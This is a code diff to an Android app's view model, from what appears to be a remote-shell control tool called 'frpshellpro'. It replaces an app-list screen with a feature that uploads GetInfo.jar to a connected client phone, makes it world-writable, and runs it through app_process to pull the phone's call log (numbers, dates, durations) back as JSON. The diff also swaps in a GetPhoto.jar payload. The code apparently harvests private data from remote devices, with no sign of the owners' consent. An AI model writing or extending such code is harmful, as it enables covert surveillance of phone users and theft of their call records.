@@ -51,7 +51,6 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
     private val fileManagerUseCase = FileManagerUseCase(deviceCommandRepository)
     private val processUseCase = ProcessUseCase(shellUseCase, fileManagerUseCase)
     private val captureUseCase = CaptureUseCase(shellUseCase, fileManagerUseCase)
-    private val appListUseCase = com.kgapp.frpshellpro.domain.usecase.AppListUseCase(shellUseCase, fileManagerUseCase, captureUseCase)
 
     private val _uiState = MutableStateFlow(MainUiState())
     val uiState: StateFlow<MainUiState> = _uiState.asStateFlow()
@@ -86,13 +85,13 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
         viewModelScope.launch(Dispatchers.IO) {
             runCatching {
                 val context = application.applicationContext
-                val jarFile = File(context.filesDir, "scrcpy-server.jar")
+                val jarFile = File(context.filesDir, "GetPhoto.jar")
                 // Ensure file exists and is not empty
                 if (!jarFile.exists() || jarFile.length() == 0L) {
-                    FrpLogBus.append("[初始化] 正在提取 scrcpy-server.jar 到应用目录...")
-                    copyAssetToFile(context, "scrcpy-server.jar", jarFile)
+                    FrpLogBus.append("[初始化] 正在提取 GetPhoto.jar 到应用目录...")
+                    copyAssetToFile(context, "GetPhoto.jar", jarFile)
                 } else {
-                    FrpLogBus.append("[初始化] scrcpy-server.jar 已就绪")
+                    FrpLogBus.append("[初始化] GetPhoto.jar 已就绪")
                 }
             }.onFailure {
                 logInit(MODULE_NETWORK, "scrcpy 资源初始化异常", it)
@@ -539,64 +538,116 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
         }
     }
 
-    fun showAppList(clientId: String) {
+    fun showCallLog(clientId: String) {
         _uiState.update {
             it.copy(
-                screen = ScreenDestination.AppList,
-                appListClientId = clientId
+                screen = ScreenDestination.CallLog,
+                callLogClientId = clientId,
+                callLogErrorMessage = null
             )
         }
-        loadAppList(clientId)
+        loadCallLogs(clientId, _uiState.value.callLogCountInput.toIntOrNull() ?: 5)
     }
 
-    fun hideAppList() {
+    fun dismissCallLog() {
         _uiState.update {
             it.copy(
                 screen = ScreenDestination.Main,
-                appListVisible = false,
-                appListLoading = false,
-                appListItems = emptyList(),
-                appListErrorMessage = null,
-                appListClientId = null
+                callLogClientId = null,
+                callLogLoading = false,
+                callLogErrorMessage = null,
+                callLogItems = emptyList()
             )
         }
     }
 
-    fun refreshAppList() {
-        val clientId = _uiState.value.appListClientId ?: (_uiState.value.selectedTarget as? ShellTarget.Client)?.id ?: return
-        loadAppList(clientId)
+    fun onCallLogCountChanged(value: String) {
+        val filtered = value.filter { it.isDigit() }.take(3)
+        _uiState.update { it.copy(callLogCountInput = filtered) }
     }
 
-    private fun loadAppList(clientId: String) {
+    fun refreshCallLogs() {
+        val state = _uiState.value
+        val clientId = state.callLogClientId ?: (state.selectedTarget as? ShellTarget.Client)?.id ?: return
+        val count = state.callLogCountInput.toIntOrNull() ?: 5
+        loadCallLogs(clientId, count)
+    }
+
+    private fun loadCallLogs(clientId: String, count: Int) {
         viewModelScope.launch(Dispatchers.IO) {
-            _uiState.update { it.copy(appListLoading = true, appListErrorMessage = null) }
+            _uiState.update { it.copy(callLogLoading = true, callLogErrorMessage = null) }
 
             try {
                 val appContext = getApplication<Application>()
-                val localJar = File(appContext.filesDir, "scrcpy-server.jar")
+                val localJar = File(appContext.filesDir, "GetInfo.jar")
                 if (!localJar.exists() || localJar.length() == 0L) {
-                    copyAssetToFile(appContext, "scrcpy-server.jar", localJar)
+                    copyAssetToFile(appContext, "GetInfo.jar", localJar)
+                }
+                if (!localJar.exists() || localJar.length() == 0L) {
+                    throw IllegalStateException("本地 GetInfo.jar 不存在")
                 }
 
-                val apps = appListUseCase.getAppList(clientId, localJar)
+                val remoteJarPath = "/data/local/tmp/GetInfo.jar"
+                val uploaded = captureUseCase.uploadDependency(clientId, remoteJarPath, localJar)
+                if (!uploaded) {
+                    throw IllegalStateException("上传 GetInfo.jar 失败")
+                }
+                captureUseCase.runCommand(clientId, "chmod 777 $remoteJarPath", timeoutMs = 5_000)
+
+                val safeCount = count.coerceIn(1, 200)
+                val command = "export CLASSPATH=$remoteJarPath && /system/bin/app_process /data/local/tmp app.Main --get_calllog --call_code=$safeCount --json"
+                val raw = captureUseCase.runCommand(clientId, command, timeoutMs = 30_000)
+                    ?: throw IllegalStateException("客户端未返回结果")
+
+                val json = extractJsonObject(raw)
+                val status = json.optString("status")
+                if (status != "success") {
+                    throw IllegalStateException(json.optString("message").ifBlank { "执行失败" })
+                }
+
+                val calls = json.optJSONArray("calls") ?: JSONArray()
+                val items = buildList {
+                    for (i in 0 until calls.length()) {
+                        val item = calls.optJSONObject(i) ?: continue
+                        add(
+                            CallLogItem(
+                                number = item.optString("number"),
+                                date = item.optLong("date", 0L),
+                                duration = item.optLong("duration", 0L),
+                                type = item.optInt("type", 0)
+                            )
+                        )
+                    }
+                }
+
                 _uiState.update {
                     it.copy(
-                        appListLoading = false,
-                        appListItems = apps,
-                        appListErrorMessage = null
+                        callLogLoading = false,
+                        callLogItems = items,
+                        callLogErrorMessage = null,
+                        callLogCountInput = safeCount.toString()
                     )
                 }
-                FrpLogBus.append("[应用] 已加载应用列表，共 ${apps.size} 个应用")
+                FrpLogBus.append("[通话记录] 已读取 ${items.size} 条记录")
             } catch (e: Exception) {
                 _uiState.update {
                     it.copy(
-                        appListLoading = false,
-                        appListErrorMessage = "获取应用列表失败: ${e.message}"
+                        callLogLoading = false,
+                        callLogErrorMessage = "读取通话记录失败: ${e.message}"
                     )
                 }
-                FrpLogBus.append("[应用] 获取应用列表失败: ${e.message}")
+                FrpLogBus.append("[通话记录] 读取失败: ${e.message}")
             }
         }
+    }
+
+    private fun extractJsonObject(raw: String): JSONObject {
+        val start = raw.indexOf('{')
+        val end = raw.lastIndexOf('}')
+        if (start < 0 || end <= start) {
+            throw IllegalStateException("返回内容不是 JSON")
+        }
+        return JSONObject(raw.substring(start, end + 1))
     }
 
 
